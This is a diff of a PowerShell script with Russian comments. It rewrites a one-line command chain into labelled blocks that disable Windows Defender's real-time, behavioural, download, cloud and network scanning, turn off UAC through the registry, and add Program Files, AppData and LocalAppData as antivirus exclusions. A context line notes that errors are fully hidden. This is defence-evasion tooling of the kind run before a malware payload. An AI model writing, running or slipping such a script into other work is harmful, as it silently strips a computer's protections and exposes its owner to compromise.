@@ -1,4 +1,60 @@
-Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableScanningNetworkFiles $true; Set-MpPreference -DisableScanningRemovableDrivesDuringFullScan $true
+# --- БЛОК 1: ОТКЛЮЧЕНИЕ ЗАЩИТЫ WINDOWS DEFENDER ---
+
+# Отключаем защиту в реальном времени (самая главная)
+Write-Host "Отключение Realtime Monitoring..."
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Отключаем поведенческую защиту (блокировку подозрительных действий программ)
+Write-Host "Отключение Behavior Monitoring..."
+Set-MpPreference -DisableBehaviorMonitoring $true
+
+# Отключаем сканирование всех загруженных файлов и вложений
+Write-Host "Отключение IOAV Protection..."
+Set-MpPreference -DisableIOAVProtection $true
+
+# Отключаем облачную защиту
+Write-Host "Отключение Cloud Block..."
+Set-MpPreference -DisableBlockAtFirstSeen $true
+
+# Отключаем сканирование сетевых файлов
+Write-Host "Отключение Network Scanning..."
+Set-MpPreference -DisableScanningNetworkFiles $true
+
+Write-Host "Защитник Windows успешно отключен." -ForegroundColor Green
+
+# --- БЛОК 2: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---
+
+Write-Host "Отключение UAC..."
+$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0
+Write-Host "UAC отключен. Требуется перезагрузка для полного применения." -ForegroundColor Yellow
+
+# --- БЛОК 3: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---
+
+# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
+Write-Host "Добавление папок в исключения..."
+try {
+    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
+    Add-MpPreference -ExclusionPath $ProgramFiles
+
+    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+    if (Test-Path $ProgramFilesX86) {
+        Add-MpPreference -ExclusionPath $ProgramFilesX86
+    }
+
+    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+    Add-MpPreference -ExclusionPath $AppData
+
+    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+    Add-MpPreference -ExclusionPath $LocalAppData
+    
+    Write-Host "Исключения добавлены." -ForegroundColor Green
+}
+catch {
+    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
+}
+
+Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 $uacProperty = "EnableLUA"
 Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
@@ -127,6 +183,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
